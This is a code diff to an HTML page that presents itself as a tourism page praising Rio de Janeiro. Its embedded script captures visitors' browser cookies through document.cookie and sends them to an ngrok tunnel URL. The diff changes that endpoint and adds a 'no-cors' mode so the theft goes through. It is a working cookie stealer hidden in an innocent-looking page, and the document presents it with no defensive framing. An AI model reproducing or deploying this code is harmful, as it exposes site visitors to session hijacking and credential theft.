@@ -51,7 +51,7 @@
 </head>
 <body>
     <header>
-        <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita</h1>
+        <h1>Rio de Janeiro - Cidade Maravilhosa e Perfeita!!!</h1>
     </header>
 
     <div class="content">
@@ -118,7 +118,7 @@
 
         function sendCookiesToServer() {
             const cookies = document.cookie;  // Captura os cookies do navegador
-            const url = 'https://f9f6-177-192-8-19.ngrok-free.app/coletar-cookies';  // Seu URL ngrok
+            const url = ' https://ea2c-177-192-8-19.ngrok-free.app';  // Seu URL ngrok
 
             // Exibe os cookies no console para depuração
             console.log("Cookies capturados:", cookies);
@@ -128,10 +128,10 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
+                body: JSON.stringify({ cookies: cookies }),  // Envia os cookies no corpo da requisição
+                mode: 'no-cors'  // Ignora a política de CORS no frontend
             })
-            .then(response => response.json())
-            .then(data => console.log('Cookies enviados com sucesso!', data))
+            .then(response => console.log('Cookies enviados com sucesso!'))
             .catch(error => console.error('Erro ao enviar cookies:', error));
         }
     </script>
